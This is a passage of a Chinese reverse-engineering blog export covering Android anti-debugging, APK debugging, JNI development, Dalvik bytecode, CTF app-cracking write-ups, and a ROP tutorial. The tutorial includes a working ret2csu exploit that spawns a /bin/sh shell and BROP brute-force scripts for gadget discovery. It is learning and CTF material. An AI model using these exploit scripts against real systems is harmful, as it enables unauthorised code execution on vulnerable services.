0x03.断点检测程序运行过程会将elf文件(使用so的情况下)导入导入内存中，如果存在断点，内存中也会改变相应的指令，留下thumb或者arm的断点指令的机器码。利用指针遍历内存中elf文件判断有无上述机器码，即可判断有无断点，进而判断是否处于debug。Exp： 1234567891011121314151617181920212223242526272829303132333435363738394041jint anti_breakpoint()&#123; Elf32_Ehdr *elfhdr; Elf32_Phdr *pht; unsigned int size, base, offset,phtable; int n, i,j; char *p; //从maps中读取elf文件在内存中的起始地址 base = GetLibAddr(); if(base == 0)&#123; LOGD(&quot;find base error/n&quot;); return 0; &#125; elfhdr = (Elf32_Ehdr *) base; phtable = elfhdr-&gt;e_phoff + base; for(i=0;i&lt;elfhdr-&gt;e_phnum;i++)&#123; pht = (Elf32_Phdr*)(phtable+i*sizeof(Elf32_Phdr)); if(pht-&gt;p_flags&amp;1)&#123; offset = pht-&gt;p_vaddr + base + sizeof(Elf32_Ehdr) + sizeof(Elf32_Phdr)*elfhdr-&gt;e_phnum; LOGD(&quot;offset:%#x ,len:%#x&quot;,offset,pht-&gt;p_memsz); p = (char*)offset; size = pht-&gt;p_memsz; for(j=0,n=0;j&lt;size;++j,++p)&#123; if(*p == 0x10 &amp;&amp; *(p+1) == 0xde)&#123; n++; LOGD(&quot;### find thumb bpt %#x /n&quot;,p); return 1; &#125;else if(*p == 0xf0 &amp;&amp; *(p+1) == 0xf7 &amp;&amp; *(p+2) == 0x00 &amp;&amp; *(p+3) == 0xa0)&#123; n++; LOGD(&quot;### find thumb2 bpt %#x /n&quot;,p); return 1; &#125;else if(*p == 0x01 &amp;&amp; *(p+1) == 0x00 &amp;&amp; *(p+2) == 0x9f &amp;&amp; *(p+3) == 0xef)&#123; n++; LOGD(&quot;### find arm bpt %#x /n&quot;,p); return 1; &#125; &#125; LOGD(&quot;### find breakpoint num: %d/n&quot;,n); &#125; &#125; return 0;&#125;","categories":[],"tags":[{"name":"AndroidRe","slug":"AndroidRe","permalink":"http://example.com/tags/AndroidRe/"},{"name":"Summary","slug":"Summary","permalink":"http://example.com/tags/Summary/"}]},{"title":"Apk 动调","slug":"APK动调","date":"2021-03-01T03:03:21.000Z","updated":"2021-03-27T01:09:07.979Z","comments":true,"path":"2021/03/01/APK动调/","link":"","permalink":"http://example.com/2021/03/01/APK%E5%8A%A8%E8%B0%83/","excerpt":"Java层与Native层的动调调试。","text":"Java层与Native层的动调调试。 DDMS(java层)主要功能 插桩-log输出 利用AndroidKiller修改apk包，在需要插桩的代码处右键log输出，填入调试时需要输出的字符串。 打包安装到设备。 ddms中找到程序对应的activity，过滤找到输出信息。 根据输出信息的时间戳找到上下文，得到方法调用层次。 栈跟踪-stacktrace 利用AndroidKiller修改apk包，在需要插桩处右键stacktrace，填入调试时需要输出的字符串。 安装打开，用ddms过滤输出信息。 根据输出信息的时间戳找到上下文，自下而上得到方法调用层次。 方法分析 DDMS处打开方法分析并限制分析的方法数。 点击ok后，立即在设备上实现需要分析的功能。 功能实现后立即点击停止方法分析。 等待方法分析窗口打开。 任意方法均可通过下拉项查看上层(parents)和下层(Children)的调用方法。 Android Studio + Smalide(java层)远程调试 在AndroidKiller中打开apk文件，用AS导入该工程文件夹 在smali文件中设置调试断点 在“运行-编辑配置”中新建“remote”类型配置，设置好调试器名称和端口 连接设备，打开需要调试的程序，用“adb shell ps”命令找到需要调试的进程 用“adb forward tcp:10001 jdwp:3523”命令远程连接，其中”tcp:”后填入调试端口号，”jdwp”后填入需要调试进程的pid 在工具栏处选择远程调试配置，点击爬虫icon进行调试 IDA Pro(Native层)远程调试将android_server(64) push到设备中，chmod赋予权限并运行。 在terminal中用adb进行端口转发。默认端口23946。 利用命令使程序挂起，此时可在设备中看见“Warnning”窗口。 adb shell am start -D -n 包名/包名+类名 打开ddms可以发现被挂起的进程名之前出现红虫虫。 打开IDA进行attach，选择进程，进入调试窗口。 勾选三个调试器选项（程序入口点，线程启动终止，库加载卸载），F9运行，此时标题显示“running”。 释放程序，此时在ddms中发现红虫虫变绿虫虫，此时程序中的提示窗口消失，程序正常运行。 在IDA的模块窗口搜索，若未发现目标库则继续运行，随后即可发现目标库被加载到IDA，开始调试。 Command List： 1234./data/user/tmp/asadb forward tcp:23946 tcp:23946adb shell am start -D -n 包名/包名+类名jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=pid","categories":[],"tags":[{"name":"AndroidRe","slug":"AndroidRe","permalink":"http://example.com/tags/AndroidRe/"},{"name":"Summary","slug":"Summary","permalink":"http://example.com/tags/Summary/"}]},{"title":"NDK开发","slug":"NDK开发","date":"2021-02-27T07:31:21.000Z","updated":"2021-03-25T02:49:22.105Z","comments":true,"path":"2021/02/27/NDK开发/","link":"","permalink":"http://example.com/2021/02/27/NDK%E5%BC%80%E5%8F%91/","excerpt":"用C/C++开发Android","text":"用C/C++开发Android Android工程一般由java语言编写，但是可以通过NDK调用native方法来执行C/C++的代码，后者代码中的标识符需要在工程中进行注册，以便在java被一一对应地找到并正确调用。下面介绍关于native方法的开发过程。 开发流程编写.java在java文件中声明需要用到的native函数，无需编写方法体。 声明后插入如下代码，以便运行时加载native库。 123static&#123; System.loadLibrary(&quot;strjni&quot;); &#125; 生成.h在src文件夹运行命令 1javah -jni com.example.ndktest.MainActivity 在工程目录新建文件夹”jni”，将src文件夹下生成的.h重命名后移动到此处。 编写mk文件在jni文件夹新建两个makefile文件，此类文件用于描述编译的相关配置。文件名及内容如下： 1234567891011#Android.mkLOCAL_PATH := $(call my-dir) include $(CLEAR_VARS) LOCAL_MODULE := strjni #模块名称 LOCAL_SRC_FILES := strjni.c #源文件 .c或者.cppLOCAL_ARM_MODE := arm #编译后的指令集 ARM指令LOCAL_LDLIBS += -llog #依赖库 include $(BUILD_SHARED_LIBRARY) #指定编译文件的类型#Application.mkAPP_ABI := armeabi-v7a 编写.c，编译根据.h中的声明，在.c文件中编写native函数的函数体。详细编写分为静态注册与动态注册。 在jni目录下执行如下命令： 1ndk-build 运行调试构建工程，连接AVD并且运行调试。 静态注册通过 JNIEXPORT 和 JNICALL 两个宏定义声明，程序加载so时会根据上面的宏定义声明链接到对应的native函数。 Exp：在Java code中声明如下函数： 123public native String get_str();public native String get_strstatic_str();public native String get_string_from_c(); 用 javah -jni 包名+类名命令生成如下.h文件： 1234567891011121314151617181920212223242526272829303132333435#include &lt;jni.h&gt;#ifndef _Included_com_example_jinstudy_MainActivity#define _Included_com_example_jinstudy_MainActivity#ifdef __cplusplusextern &quot;C&quot; &#123;#endif/* * Class: com_example_jinstudy_MainActivity * Method: get_str * Signature: ()Ljava/lang/String; */JNIEXPORT jstring JNICALL Java_com_example_jinstudy_MainActivity_get_str (JNIEnv *, jobject);/* * Class: com_example_jinstudy_MainActivity * Method: get_strstatic_str * Signature: ()Ljava/lang/String; */JNIEXPORT jstring JNICALL Java_com_example_jinstudy_MainActivity_get_strstatic_str (JNIEnv *, jobject);/* * Class: com_example_jinstudy_MainActivity * Method: get_string_from_c * Signature: ()Ljava/lang/String; */JNIEXPORT jstring JNICALL Java_com_example_jinstudy_MainActivity_get_string_from_c (JNIEnv *, jobject);#ifdef __cplusplus&#125;#endif#endif 我们发现原本Java中的String类型，变成了C中的jstring类型，这是两种语言在数据结构上的映射。详细对应情况如下： 引入上述.h，编写如下.c文件 12345678910111213141516171819202122232425262728293031323334353637#include &lt;JNIstudy.h&gt;JNIEXPORT jstring JNICALL Java_com_example_jinstudy_MainActivity_get_str_from_c (JNIEnv *env, jobject obj)&#123; //类型转换 NewStringUTF(env，字符串) jstring str= (*env)-&gt;NewStringUTF(env, &quot;Test&quot;); return str;&#125;//调用java层普通字段JNIEXPORT jstring JNICALL Java_com_example_jinstudy_MainActivity_get_str (JNIEnv *env, jobject obj)&#123; //1.获取类 //FindClass:第一个env，第二个：字段所在类的路径（点换成斜杠） jclass _jclass = (*env)-&gt;FindClass(env,&quot;com/example/jinstudy/MainActivity&quot;); //2.获取字段ID //GetFieldID:第一个env，第二个FindClass的返回值，第三个java层字段的名称，第四个java层字段的签名 jfieldID _jfieldID = (*env)-&gt;GetFieldID(env, _jclass, &quot;ZD&quot;, &quot;Ljava/lang/String;&quot;); //3.获取字段 //GetObjectField:第一个env，第二个obj，第三个GetFieldID的返回值 jobject str= (*env)-&gt;GetObjectField(env, obj, _jfieldID); return str;&#125;//调用java层静态字段JNIEXPORT jstring JNICALL Java_com_example_jinstudy_MainActivity_get_static_str (JNIEnv *env, jobject obj)&#123; //1.获取类：FindClass（） jclass _jclass = (*env)-&gt;FindClass(env,&quot;com/example/jinstudy/MainActivity&quot;); //2.获取静态字段ID jfieldID _jfieldID= (*env)-&gt;GetStaticFieldID(env, _jclass, &quot;ZD1&quot;,&quot;Ljava/lang/String;&quot;); //3.获取静态字段 //GetStaticObjectField:第一个env，第二个是类,既FindClass的返回值，第三个参数GetStaticFieldID的返回值 jobject str= (*env)-&gt;GetStaticObjectField(env, _jclass, _jfieldID); return str;&#125; 需要注意的是： 通常在我们编写native函数时，此类函数都会自带两个参数，分别为JNIEnv *和jobject，紧接着才是该函数在Java层中声明的参数列表。 我们通常需要返回一个jobject类型的对象，这就需要用到GetStaticObjectField方法，其参数分别是JNIEnv*,jclass,jfiledID。这里的JNIEnv以及本节中后文的JNIEnv均和native函数传入的第一个参数是一样的。 jfiledID对象将Java层的字段类型映射到C中，其需要通过GetStaticFieldID方法获取，而此方法的参数为JNIEnv*,jclass,string,string。string类型的第一个参数需要传入的是字段在Java层中的名称，第二个参数则是该参数的完整类型名称并以’;’结尾。 jclass则需要使用FindClass方法获取，其参数为JNIEnv*，string。string类型参数需要传入的是函数所在类的路径名，可以理解成将’.’替换成’/‘的包名+类名。 其实静态注册的代码编写的要点就是，需要的获取什么样的类型，就在jni.h中寻找能返回该类型的对应方法，再补全此方法的参数。本质是一个递归补全参数的过程😂。 动态注册通过 RegisterNatives函数由编程者完成 native函数与so中函数的绑定，使得程序可以通过这个映射表找到相应的函数了。 Exp:在Java code中声明如下加减乘除函数: 1234public native double add(double number1,double number2); public native double sub(double number1,double number2); public native double mul(double number1,double number2); public native double div(double number1,double number2); 引入jni.h后直接编写对应的.c文件： 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;jni.h&gt;jdouble addc(JNIEnv *env, jobject obj, jdouble a, jdouble b)&#123; return a+b;&#125;jdouble subc(JNIEnv *env, jobject obj, jdouble a, jdouble b)&#123; return a-b;&#125;jdouble mulc(JNIEnv *env, jobject obj, jdouble a, jdouble b)&#123; return a*b;&#125;jdouble divc(JNIEnv *env, jobject obj, jdouble a, jdouble b)&#123; return a/b;&#125;//声明native方法结构体JNINativeMethod nm[]=&#123; //参数：需绑定的java层函数名,参数返回值类型,需绑定的native函数指针 &#123;&quot;add&quot;,&quot;(DD)D&quot;,(void*)addc&#125;, &#123;&quot;sub&quot;,&quot;(DD)D&quot;,(void*)subc&#125;, &#123;&quot;mul&quot;,&quot;(DD)D&quot;,(void*)mulc&#125;, &#123;&quot;div&quot;,&quot;(DD)D&quot;,(void*)divc&#125;&#125;;//动态注册JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* vm, void* reserved)&#123; JNIEnv* env; if( (*vm)-&gt;GetEnv(vm, (void**)&amp;env, JNI_VERSION_1_4)!=JNI_OK)&#123; return JNI_ERR; &#125; jclass jc = (*env)-&gt;FindClass(env,&quot;com/example/calcu/MainActivity&quot;); if((*env)-&gt;RegisterNatives(env, jc, nm,sizeof(nm)/sizeof(nm[0]))!=JNI_OK)&#123; return JNI_ERR; &#125; //固定返回值 return JNI_VERSION_1_4;&#125; 需要注意： 编写函数体的过程和静态注册差异不大 由于没有生成.h文件对函数进行声明，因此我们需要将所有函数整合为一个JNINativeMethod类型的结构体。其属性分别为函数再Java层中的字段名(string)，参数和返回值类型(string)，其中参数写在括号内，返回值写在括号外，最后一个参数是Native方法的函数指针(void *)。 对上述结构体用RegisterNatives方法进行注册，补全相应的参数后，写入JNI_OnLoad函数体中，该函数是动态注册是Native方法的入口。","categories":[],"tags":[{"name":"AndroidRe","slug":"AndroidRe","permalink":"http://example.com/tags/AndroidRe/"},{"name":"Summary","slug":"Summary","permalink":"http://example.com/tags/Summary/"}]},{"title":"Dalvik字节码","slug":"Dalvik字节码","date":"2021-02-21T08:24:28.000Z","updated":"2021-03-25T02:49:10.397Z","comments":true,"path":"2021/02/21/Dalvik字节码/","link":"","permalink":"http://example.com/2021/02/21/Dalvik%E5%AD%97%E8%8A%82%E7%A0%81/","excerpt":"看懂Dalvik字节码，看懂Smali文件。","text":"看懂Dalvik字节码，看懂Smali文件。 寄存器存储变量≤32位，用1个寄存器 存储变量64位，用2个相邻寄存器 寄存器命名法v命名法局部变量：M个 使用寄存器：v0~vM-1 传入参数：N个 使用寄存器：vM~vM+N-1 p命名法局部变量：M个 使用寄存器：v0~vM-1 传入参数：N个 使用寄存器：p0~pN-1 smali数据类型 字段与函数分析字段格式1Lpackage/name/ObjectName;-&gt;FieldName:Ljava/lang/String; 分析为java： 1234package Lpackage.nameclass ObjectName&#123; String FieldName;&#125; 函数格式1Lpackage/name/ObjectName;-&gt;MethodName(III)Z 分析为java： 1234567package Lpackage.nameclass ObjectName&#123; public Boolean MethodName(int ,int ,int ) &#123; return true; &#125;&#125; Dalvik指令格式 格式：基础字节码-名称后缀/字节码后缀 目的寄存器 源寄存器 exp： move - wide / from16 vAA , vBBBB 其中move为基础字节码，opcode wide为名称后缀,标识指令操作的数据宽度为64位。 from16为字节码后缀,标识源为一个16位的寄存器引用变量 vAA为目的寄存器,它始终在源的前面，取值范围为v0~v255 vBBBB为源寄存器，取值范围为v0~v65535","categories":[],"tags":[{"name":"AndroidRe","slug":"AndroidRe","permalink":"http://example.com/tags/AndroidRe/"},{"name":"Summary","slug":"Summary","permalink":"http://example.com/tags/Summary/"}]},{"title":"Android基础","slug":"Android基础","date":"2021-02-12T12:14:08.000Z","updated":"2021-03-25T02:49:01.125Z","comments":true,"path":"2021/02/12/Android基础/","link":"","permalink":"http://example.com/2021/02/12/Android%E5%9F%BA%E7%A1%80/","excerpt":"补充一些关于Android的系统知识。","text":"补充一些关于Android的系统知识。 APK包结构 Filename Property assets 静态资源（图片，配置文件，html5离线资源）任意深度子目录 res 程序资源（图片，图标，字符串）拥有对应资源id，关联代码R.java lib 依赖库（当前app用到的so） META-INF 证书签名文件 .dex 可执行文件（方法数&gt;2¹⁶时分包） AndroidManifest.xml 项目的系统清单（配置、四大组件的声明） resources.arsc 资源索引表 Android打包流程 1.资源→源码 2.接口→源码 3.源码→字节码 4.字节码→可执行 5.可执行→apk 6.apk签名 7.apk对齐压缩 APK安装流程 1.在/data/app创建以apk包名命名的文件夹，并将apk解压至此 2.在/data/data创建以apk包名命名的文件夹，解析AndroidManifest.xml并上述文件夹写入应用数据 3.优化dex文件，保存于”/data/dalvik-cache/profiles/“+apk包名 虚拟机 类型 运行 机制 特点 java虚拟机 Java字节码(.class) 略 基于栈架构 Dalvik虚拟机 DEX字节码（.odex） jit编译机制 基于寄存器架构（≤Android 5.0） ART虚拟机 DEX字节码（.oat） aot编译机制 基于寄存器架构（&gt;Android 5.0） Android四大组件四大组件 Name What for 活动(Activity) 表现功能，可视化的指令操作窗口 服务(Services) 长期后台执行，无交互 广播接收者(Broadcast Recive) 接收其他应用程序的广播信息 内容提供者(Content Provider) 数据集，由多个应用程序共享使用 Activity生命周期","categories":[],"tags":[{"name":"AndroidRe","slug":"AndroidRe","permalink":"http://example.com/tags/AndroidRe/"},{"name":"Summary","slug":"Summary","permalink":"http://example.com/tags/Summary/"}]},{"title":"Android Re","slug":"Android_Re","date":"2020-10-30T12:14:08.000Z","updated":"2021-03-24T09:49:58.007Z","comments":true,"path":"2020/10/30/Android_Re/","link":"","permalink":"http://example.com/2020/10/30/Android_Re/","excerpt":"​ 安卓逆向入门入门。","text":"​ 安卓逆向入门入门。最近可算开始学安卓逆向了，先刷刷jarvis oj上的题康康。 0x00 . Smail​ 题目只给了一个.smail文件。smail是Davlik虚拟机的寄存器语言，相当于pc平台的汇编语言，可以看出个大概逻辑。 ​ 不过当然可以借助Smail2java工具，将其转换成.java文件。 ​ java如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445package net.bluelotus.tomorrow.easyandroid;import android.util.Base64;import java.io.PrintStream;import java.security.NoSuchAlgorithmException;import javax.crypto.NoSuchPaddingException;import java.security.InvalidKeyException;import javax.crypto.IllegalBlockSizeException;import javax.crypto.BadPaddingException;import javax.crypto.spec.SecretKeySpec;import javax.crypto.Cipher;import java.security.Key;import java.security.GeneralSecurityException;public class Crackme &#123; private String str2 = &quot;cGhyYWNrICBjdGYgMjAxNg==&quot;; public Crackme() &#123; GetFlag(&quot;sSNnx1UKbYrA1+MOrdtDTA==&quot;); &#125; private String GetFlag(String p1) &#123; byte[] &quot;content&quot; = Base64.decode(p1.getBytes(), 0x0); String &quot;kk&quot; = new String(Base64.decode(str2.getBytes(), 0x0)); System.out.println(decrypt(&quot;content&quot;, &quot;kk&quot;)); return null; &#125; private String decrypt(byte[] p1, String p2) &#123; String &quot;m&quot; = 0x0; try &#123; byte[] &quot;keyStr&quot; = p2.getBytes(); SecretKeySpec &quot;key&quot; = new SecretKeySpec(&quot;keyStr&quot;, &quot;AES&quot;); Cipher &quot;cipher&quot; = Cipher.getInstance(&quot;AES/ECB/NoPadding&quot;); &quot;cipher&quot;.init(0x2, &quot;key&quot;); byte[] &quot;result&quot; = &quot;cipher&quot;.doFinal(p1); return &quot;m&quot;; &#125; catch(NoSuchPaddingException &quot;e&quot;) &#123; &quot;e&quot;.printStackTrace(); &#125; return &quot;m&quot;; &#125;&#125; ​ 一开始一直在纠结Cipher.getInstance啥的看不懂，然后打算丢去eclipse或者Android Studio直接跑但是碰到一堆编译问题，十分头疼。看了看解析，原来只要明白是AES加密就可以了（果然逆向还是得专注关键代码），于是用python解码： 123456import base64from Crypto.Cipher import AEScode = base64.b64decode(&quot;sSNnx1UKbYrA1+MOrdtDTA==&quot;)key = base64.b64decode(&quot;cGhyYWNrICBjdGYgMjAxNg==&quot;)aes=AES.new(key,AES.MODE_ECB)print aes.decrypt(code) 0x01 . 爬楼梯​ 安装apk并打开，是一个爬楼小游戏，点击按钮爬楼，爬到了就能看flag。 ​ 看到这第一时间想到了八门神器，直接给root权限然后修改已爬楼层就完事。但是莫名其妙的是八门神器好像不适配模拟器的安卓版本（7.1.2），模拟器已经分配了超级用户权限，但是打开八门依旧提示没有root权限。 ​ 于是反汇编apk，研究研究逻辑。 ​ 确实是爬到楼层即可看flag，不过楼层数每次打开都是个随机数，该随机数要对32进行取余，因此有一定概率在打开后发现楼层数为0，可以直接拿flag。 ​ 不过还是采用专业办法，用mt管理器解压，Dex编辑器查看dex文件。 ​ ​ 接着找到MainActivity()。 ​ 发现第一行处v5被初始化为0，8-9行处用v5初始化v0，然后将v0的值用作参数调用flag组件的 setClickable()函数。也就是说将v5初始化值改为1即可使得flag组件一直处于clickable。 ​ 改了之后在右上角点击保存，退出再保存一次，然后一路退出。 ​ ​ 然后全选(左右划动选择)，长按压缩，选择apk模式。 ​ 然后长按CFF.apk，功能-apk签名。 ​ 然后安装，拿到flag。 0x02 . FindPass​ 模拟器安装apk打开瞅瞅。 ​ jeb反编译apk瞅瞅。 ​ 比较输入的字符串(v5)和v4是否一致，一致则得到flag。 ​ 在运行过程中，v4必然会存储到内存中，因此我们可以动调查看。在模拟器文件夹打开终端，输入以下命令，得到模拟器端口号。 ​ 然后再用系统的adb连接上端口。 ​ 在模拟器打开app，然后在jeb打开调试器，选择开始调试，就可以找到模拟器的进程。 ​ 附上之后开始调试。 ​ 发现报错，原来是apk设置成了不可调试。用apktools反编译出来，然后修改xml，在application标签中加上**android:debuggable=”true”**并用空格隔开。 ​ 重新调试，在标签90处下断点，已知v9中存的就是v4的flag。 ​ 查看局部变量列表，即可发现flag。","categories":[],"tags":[{"name":"AndroidRe","slug":"AndroidRe","permalink":"http://example.com/tags/AndroidRe/"}]},{"title":"Intermediate ROP","slug":"Intermediate_ROP","date":"2020-08-19T14:19:07.000Z","updated":"2021-03-24T09:46:39.337Z","comments":true,"path":"2020/08/19/Intermediate_ROP/","link":"","permalink":"http://example.com/2020/08/19/Intermediate_ROP/","excerpt":"​ Ret2csu &amp; BROP","text":"​ Ret2csu &amp; BROP 0x00 . ret2csuA . 原理​ 这个技术算是一个通用的rop技术，用到了__libc_csu_init()这个函数，只要程序调用了库函数就一定需要调用这个函数对库进行初始化。 ​ 写一个简单demo： 1234567891011121314//level5.c#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void vulnerable_function() &#123; char buf[128]; read(STDIN_FILENO, buf, 512);&#125;int main(int argc, char** argv) &#123; write(STDOUT_FILENO, &quot;Hello, World\\n&quot;, 13); vulnerable_function();&#125; ​ 关闭canary，关闭pie进行64位编译。然后利用objdump命令，可以看到各个段反汇编的情况： 12gcc -fno-stack-protector -no-pie level5.c -o level5objdump -d level5 ​ 仔细观察这个函数，我们可以发现一下有用的gadget： ​ 如果我们能构造rop链，使得系统先执行1，再执行2，那么就可以控制rdi，rsi，rdx三个寄存器。在1处，我们发现了6个弹栈操作，系统将栈上数据储存到寄存器中，而后在2处我们又通过这些寄存器给rdi，rsi，rdx进行了赋值。 ​ 因为反汇编的偏差，在ida中看0x4005D9，发现系统随后调用了rbx*8+r12这个地址。我们可以通过控制这两个寄存器来控制调用地址，进而实现攻击或者数据泄露。 ​ 完整流程如下： 程序通过溢出跳转到1开始执行。 程序执行到0x4005F4处的ret，返回到我们通过溢出而预设的返回地址，即2处。 程序从2处一直往下执行，0x4005D9处调用完函数后返回到0x4005DD继续执行。 执行0x4005DD，使得rbx寄存器+1，接着比较rbx，rbp，如果相等则不跳转，接着往下执行。因此这里我们需要预设寄存器的值使得rbx，rbp满足不跳转的条件。也就是要让rbx+1 == rbp。 再次执行到0x4005F4处的ret，rop链结束。 ​ 当然，该技术也有一些需要注意的点： 0x4005D6中的赋值只是对edi赋值，也就是说仅改变了rdi寄存器的低32位，如果rdi本身数值过大，则需要另外找gadget。 为了让rbx+1 == rbp，我们可以简单地设置让rbx = 0，rbp = 1。 因为需要两次经过1处，所以后一次经过的时候也需要设置6个寄存器的值(垃圾值即可)，然后再加上最后的返回地址，来避免程序崩溃。 B . 示例​ 用level5解题进行演示。 ​ 既然有gadget了，那么思路就比较清晰了： 通过ret2csu设置rbx为0，rbp为1，r12为需要执行的函数地址，r13，r14，r15，分别为r12函数的参数，ret设置返回地址，比如main。 第一次ret2csu，将write_got写入rop链，泄露出write的真实地址，再计算libc和其他所需地址。 第二次ret2csu，将read_got写入rop链，将system地址和”/bin/sh”字符串写入到bss段。 第三次ret2csu，将bss_addr写入rop链，参数为bss_addr + 8，则执行execve(“/bin/sh”,0,0); ​ 当然，最后一次ret2csu，用system函数也是可以的。不过我貌似没成功。而且理论上直接调用execve地址就完了，没必要写在bss上，但是实际操作上却行不懂。暂时存疑。 Exploit 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from pwn import *context.log_level = &#x27;debug&#x27;p = process(&quot;./level5&quot;)elf = ELF(&quot;./level5&quot;)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;) #&quot;ldd level5&quot; to figuer out the libc versionread_got = elf.got[&#x27;read&#x27;]write_got = elf.got[&#x27;write&#x27;]bss_addr = 0x601038main_addr = 0x400558write_offset = libc.symbols[&#x27;write&#x27;]execve_offset = libc.symbols[&#x27;execve&#x27;]print execve_offsetdef csu(rbx,rbp,r12,r13,r14,r15,ret): payload = 136*&#x27;A&#x27; payload += p64(0x4005e6)# gadget1 modify r13,r14,r15 payload += p64(0) # padding payload += p64(rbx) # rbx payload += p64(rbp) # rbp payload += p64(r12) # call addr payload += p64(r13) # rdi payload += p64(r14) # rsi payload += p64(r15) # rdx payload += p64(0x4005d0) # gadget2 modify rdi,rsi,rdx payload += &#x27;A&#x27;*0x38 # padding again for register payload += p64(ret) # ret p.sendline(payload) p.recvuntil(&quot;Hello, World&quot;)csu(0,1,write_got,1,write_got,8,main_addr)temp = p.recv(8)#write_addr = u64(temp.ljust(8,&#x27;\\x00&#x27;))write_addr = 0x7ffff7af4140print &quot;here is write_addr:&quot; +hex(write_addr)libc_addr = write_addr - write_offsetexecve_addr = libc_addr + execve_offsetprint &quot;Now we know the execve_addr:&quot;,print execve_addrbin_addr = libc_addr + next(libc.search(&#x27;/bin/sh&#x27;))p.recvuntil(&quot;Hello, World&quot;)csu(0,1,read_got,0,bss_addr,16,main_addr)p.send(p64(execve_addr) + &quot;/bin/sh\\x00&quot;)#gdb.attach(p) #To see if you write the data successfullyp.recvuntil(&quot;Hello, World&quot;)csu(0,1,bss_addr,bss_addr+8,0,0,execve_addr)p.interactive() C . 小技巧​ 我们直接看__libc_csu_init()发现0x4005ea到0x4005f3并不是每个字节各表示一条汇编语句，有几句占了两个字节。 ​ 然而直接看0x4005ed的话，我们会发现此处的汇编语句是pop rsp; ​ 0x4005efc处是pop rbp; ​ 还有pop rsi和pop rdi。 ​ 通过偏移我们可以找到不少gedget。 0x01 . BROPA . 原理​ 这个技术挺🐂🍺的。是几个斯坦福大学的师傅在公元2014年发表的论文中提出的一项ROP技术，也有通俗的ppt。 ​ BROP就是blink rop，是指没有源程序源代码的情况下(一般是只允许远程连接)进行rop并且getshell。方法就是通过有限数据对程序结构进行合理猜测以及进行适当的爆破。 ​ 适用条件如下： 存在栈溢出 进程崩溃后自行重新启动，并且重启后各地址与之前进程地址一致。 ​ 攻击步骤如下： 确定溢出长度。 寻找可行返回地址。 寻找gadget。 确定plt表。 确定got表。 泄露部分程序二进制数据。 确定libc并进行攻击。 ​ 以下结合 HCTF2016 的出题人失踪了一题逐步解释，通过本地docker进行远程攻击。 1 . 确定溢出长度​ 我们需要确定溢出点到返回地址的距离，通过爆破可以实现。在i逐渐递增时，如果某一个i的值使得程序发生EOF错误，就说明溢出长度超过了返回地址，那么i-1则可以视作溢出长度。 123456789101112131415161718def find_length(): i = 1 while 1: try: p = remote(&quot;127.0.0.1&quot;,10000) p.recvuntil(&quot;\\n&quot;) p.send(&#x27;a&#x27; * i) output = p.recv() print output p.close() if not output.startswith(&quot;No password&quot;): return i-1 else: i+=1 except EOFError: p.close() return i-1length = 72 2.寻找可行返回地址​ 这里说的返回地址，是填充在rop链末端以便控制返回用的。大概是类似main()函数之类的位置，用来控制流程。 ​ 要寻找可行返回地址(stop_addr)很简单，在知道溢出长度的情况下，只要从0x400000开始爆破，如果找到某一个addr能成功让程序返回main()函数，就说明这个地址可行。 123456789101112131415161718def fine_stop(): addr = 0x400556 while addr&lt;0xffffff: try: p = remote(&quot;127.0.0.1&quot;,10000) p.recvuntil(&quot;\\n&quot;) p.send(&#x27;a&#x27; * length + p64(addr)) p.recv() p.close() print &quot;===================&quot; print &quot;This addr might work : %x&quot;%addr print &quot;===================&quot; addr+=1 except Exception: print &quot;%x--Nah&quot;%addr addr+=1 p.close()stop_gadget = 0x4006b6 ​ 这样找出来的地址可能有不少，我们挑一个就行。 ​ 这里我们为了方便，直接让stop_addr = 0x4006B6，也就是main()函数的地址。 3.寻找gadget​ 又叫stack reading，旨在寻找可行的pop_ret语句，完成对于寄存器的修改。 ​ 我们知道，栈上的数据布局正常来说是这样的。 1padding|canary|parameters&#x2F;pop_ret|saved returned address ​ 所以总的来说，能够使程序顺利执行的rop链基本上有如下2种结构： 1payload = padding + return addr 1payload = padding + canary + pop_ret + arg1 + ... ... + argn + return addr ​ 如果我们要找pop_ret语句，爆破第二个payload即可。控制arg的数量为n个，就可以找出pop出n个寄存器的语句。该题中，我们找ret2csu中的 1234567pop rbx;pop rbp;pop r12;pop r13;pop r14;pop r15;ret; ​ 则使用如下payload： 1payload = padding + pop_ret + p64(0) * 6 + return addr ​ 如果爆破得到了一个pop_ret顺利使得程序返回到了main()就说明它有可能是我们要找的地址。 ​ 我们还需要测试，如果不按套路给予寄存器足够的值，程序会不会崩溃： 1payload = padding + pop_ret + p64(0) * 10 ​ 如果程序崩溃，那么说明pop_ret确实是我们要找的地址，因为上述payload使其返回到了地址0x0000。 1234567891011121314151617181920212223242526272829303132333435363738394041def fine_csu(): addr = 0x4007a0 while 1: try: print &quot;%x connecting...&quot;%addr p = remote(&quot;127.0.0.1&quot;,10000) p.recvuntil(&quot;\\n&quot;) payload = &#x27;a&#x27; * length #now try the rop_chain payload+=p64(addr) #ret of vuln_func(may be) payload+=p64(1) + p64(2) +p64(3) + p64(4) + p64(5) +p64(6) payload+=p64(stop_gadget) #ret of pop_ret p.send(payload) output = p.recv() p.close() if not output.startswith(&quot;WelCome&quot;): #which means we fault to return to the main() successfully print &quot;%x doesn&#x27;t working...&quot;%addr addr+=1 continue else: try: #Here we need to test the addr p = remote(&quot;127.0.0.1&quot;,10000) p.recvuntil(&quot;\\n&quot;) payload = &#x27;a&#x27; * length payload+=p64(addr) payload+=p64(0)*10 #the given addr 0x00000000 would be unreachable for the process p.send(payload) output = p.recv() p.close() print &quot;Fake addr : %x&quot;%addr #The addr couldn&#x27;t be the pop_ret we need if the process exit successfully continue except Exception: #If the program crashes,we can be sure that we got the right gadget addr print &quot;We found!!! The addr is : %x&quot;%addr return 1 except EOFError: print &quot;%x caused a EOF error...&quot;%addr p.close() addr+=1 continuecsu_pop_ret = 0x4007bapop_rdi = csu_pop_ret + 9pop_rsi = csu_pop_ret +7 4 . 确定plt表​ 一般来说这里找的是输出函数的plt表，例如write和puts。 ​ 因为我们不知道程序中有啥数据有啥字符串，所以我们用0x400000当作输出的地址，ELF文件的开头是”\\x7fELF”，只要爆破出某个地址能成功输出”\\x7fELF”，我们就能确定找到了正确的输出函数。 